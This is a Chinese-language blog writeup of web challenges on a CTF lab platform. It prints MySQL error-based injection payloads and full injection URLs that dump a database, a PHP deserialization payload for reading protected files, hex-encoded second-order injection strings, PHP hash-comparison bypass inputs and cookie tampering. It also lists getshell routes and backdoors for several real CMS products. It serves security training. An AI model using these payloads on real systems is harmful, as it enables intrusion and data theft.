---
title: 某ctf平台writeup
date: 2019-03-12 15:03:18
tags:
    - CTF
categories:
    - CTF
    - writeup
---
## 简单的post题目
（真实实战环境会有通过改变get提交为post提交绕过waf之类）
题目代码
![image001.png](https://upload-images.jianshu.io/upload_images/4838174-7a5f53f2cd988a9c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

Post提交what=flag 
<!--more--> 
 ![image002.png](https://upload-images.jianshu.io/upload_images/4838174-6c22e33bdb56d996.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## 简单的限制题目  
实际渗透过程中修改元素 、js限制等绕过上传getshell
![image003.png](https://upload-images.jianshu.io/upload_images/4838174-0e05f9297ec1da97.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![image004.png](https://upload-images.jianshu.io/upload_images/4838174-b743cd455224e86a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![image005.png](https://upload-images.jianshu.io/upload_images/4838174-4ffa4088b5fe4ffb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## 你能看懂js嘛?
直接看源代码
![![image007.png](https://upload-images.jianshu.io/upload_images/4838174-c7ea5e48d015ce35.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image008.png](https://upload-images.jianshu.io/upload_images/4838174-4aeb2543523b01b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image009.png](https://upload-images.jianshu.io/upload_images/4838174-8e14e223fe153916.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image010.png](https://upload-images.jianshu.io/upload_images/4838174-c316c0210f7d8203.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image011.png](https://upload-images.jianshu.io/upload_images/4838174-7d55acb0286caffc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image012.png](https://upload-images.jianshu.io/upload_images/4838174-2ef775acab2efad2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image013.png](https://upload-images.jianshu.io/upload_images/4838174-e363cf3a052487c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image014.png](https://upload-images.jianshu.io/upload_images/4838174-129671b532a8695a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image015.png](https://upload-images.jianshu.io/upload_images/4838174-1225668bf3cbb38b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image016.png](https://upload-images.jianshu.io/upload_images/4838174-d619481c61380103.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image017.png](https://upload-images.jianshu.io/upload_images/4838174-ad1cd2fdd1d07e61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image018.png](https://upload-images.jianshu.io/upload_images/4838174-7781e541e77a287a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image019.png](https://upload-images.jianshu.io/upload_images/4838174-8c79d2912a2cff41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image020.png](https://upload-images.jianshu.io/upload_images/4838174-c73f443f904820bf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![image021.png](https://upload-images.jianshu.io/upload_images/4838174-ca70ef865f04e964.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
](https://upload-images.jianshu.io/upload_images/4838174-9805fd1244848200.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## Cookie操作  
考察cookie绕过，真实渗透中cookie中会有类似0、1类型标识，修改cookie获取管理员权限等
Burpsuite抓包
修改isadmin=true 
 
## SQL注入三 
主要考察报错注入  实战中也比较多
Burpsuite抓包
加’或者\报错 而且单参数进入多条sql语句查询
直接使用报错注入语法：
以下10中mysql报错注入 
1. floor()
```
select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

2. extractvalue()
```bash
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
```
3. updatexml()
```bash
select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
```

4. geometrycollection()
```bash
select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
```

5. multipoint()
```bash
select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
```

6. polygon()
```
select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
```

7. multipolygon()
```
select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
```

8. linestring()
```
select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
```

9. multilinestring()
```
select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
```

10. exp()
```
select * from test where id=1 and exp(~(select * from(select user())a));
```

```bash
获取数据库
http://192.168.11.12/ctf/50/content.php?id=1 and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) &rnd=21232f297a57a5a743894a0e
ctf4
获取表名
http://192.168.11.12/ctf/50/content.php?id=1 and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)) &rnd=21232f297a57a5a743894a0e
basic,flag
获取字段名
http://192.168.11.12/ctf/50/content.php?id=1 and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167),0x7e),1)) &rnd=21232f297a57a5a743894a0e
id,flag
直接获取flag
http://192.168.11.12/ctf/50/content.php?id=1 and (updatexml(1,concat(0x7e,(select flag from ctf4.flag),0x7e),1)) &rnd=21232f297a57a5a743894a0e
 
```
 
## Snoopy Flag Service
考察php封装协议和lfi 
- 查看源代码 
- 根据url判断应该问文件包含 
- 解密得知有waf
- url编码绕过
     
## you are not admin！
考察实战中反序列化漏洞
- 查看页面源代码  
- 读取index.php  
- 读取class.php 
- 正常应该去读f1a9.php但是有限制
if(preg_match("/f1a9/",$file)){  exit();}
这样只能利用反序列化来读取flag文件
于是我们构造反序列化的参数：
O:4:"Read":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=f1a9.php";}
 
## Sql注入五   经典二次注入
获取美女手机号
提示高危漏洞排除弱口令
直接注册在登录口加一些让sql语句报错的关键字，例如’ \ )等等,都不行，但是只有在phone处出现字母就返回
 
猜测后端可能用了某种判断输入手机号是不是数字或者包含字母，具体未知
另外admin已经注册，猜测应该要求是获取admin手机号
 
url变为http://192.168.11.12/ctf/57/index.php 尝试越权直接访问不行
 
返回有几个人和我当前注册手机号一样
测试后端场景SQL语句：SELECT COUNT(*) FROM user WHERE phone = '123456'
进一步对phone长度进行测试，发现40多位的都可以
 
那么存储phone的这个字段类型一定不是int或者char而是varchar
继续进行十六进制提交，结果可以注册，判断前边验证手机号应该使用了is_numberic()函数
提交123' --+的十六进制 0x31323327202d2d2b
 
点击check，报错，说明此处存在漏洞
 
写一个union尝试
123456' union select version() from dual where '1'='1
0x3132333435362720756e696f6e2073656c6563742076657273696f6e28292066726f6d206475616c207768657265202731273d2731
 
 
继续获取数据及字段
123456' UNION SELECT version() FROM dual where 's'='s
0x3132333435362720554e494f4e2053454c4543542076657273696f6e28292046524f4d206475616c207768657265202773273d2773
继续构造查询

## 图片隐写
直接binwalk分析 
Formost出来三个rar 
中间的rar带密码 尝试弱口令 admin 返回结果 
Gief name   php加密解密
输入1返回 
输入admin
提示name=595752746157343d 时跳转flag.php
 
## 流量分析
任一telnet报跟踪流就可以返回flag
  
你能绕过拿flag？
MD5不能处理数组
PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。
常见的payload有:
```bash
    QNKCDZO
    240610708
    s878926199a
    s155964671a
    s214587387a
    s214587387a
     sha1(str)
    sha1('aaroZmOk')  
    sha1('aaK1STfY')
    sha1('aaO8zKZF')
    sha1('aa3OFF9m')
但是该题为(md5($_GET['a']) === md5($_GET['b']))
如果==可以通过上边绕过

===只能通过数组绕过 
```
 
## 计算题    渗透必备技能--python
```python 
#!/usr/bin/env python
# coding:utf-8
import requests
#导入requests模块
url="http://192.168.11.12/ctf/23/index.php?rnd=21232f297a57a5a743894a0e"
a=requests.session()
a1=a.get(url)
#print a1.text
b=a1.text
#获取网页内容
b1=b.find("<br/>")
b2=b.find("</p>",b1)
#print b1
#print b2
#找到我们要计算的式子的前后位置
b3=b[b1+5:b2]
#去掉换行
#print b3
b4=eval(b3)
#计算式子的值
#print b4
payload={"result":b4}
#将计算式赋值给一个变量
a2=a.post(url,payload)
print a2.text
```

## 你能找到问题所在     
考察文件包含漏洞
 
随便点击会有图片出现，猜测应该是文件包含
Web路径下发现robots.txt
查看页面源代码
添加参数
 
## Sql注入四 成绩查询    考察sql注入类型--时间盲注
时间盲注
直接发送到sqlmap就可以
 
## 火眼金睛
```python 
#!/usr/bin/env python
# coding:utf-8
import requests
#导入requests模块
url1="http://192.168.11.12/ctf/21/index.php?rnd=21232f297a57a5a743894a"
url2="http://192.168.11.12/ctf/21/work.php?rnd=21232f297a57a5a743894a"
a=requests.session()
a1=a.get(url1)
#print a1.text
b=a1.text
#获取网页内容
b1=b.find("100'>")
b2=b.find("</textarea>",b1)
#print b1
#print b2
b3=b[b1+5:b2]
#print b3
b4=b3.count("moctf")
#print b4
payload={"answer":b4}
#将计算式赋值给一个变量
a2=a.post(url2,payload)
print a2.text
```
 
## AWD
- 南方弱口令 
- 网站asp后门
- Sqlserver 1433弱口令

- dede织梦多个注入漏洞
- 直接进后台getshell
- Php 后门

- Beescms
- 前端页面代码执行
- 变量覆盖session 替换
- 直接getshell
- php后门

- Finecms
- 注册会员上传头像 修改请求getshell
- Php后门

- Windows 涉及永恒之蓝   真实渗透中在内网渗透过程非常有用





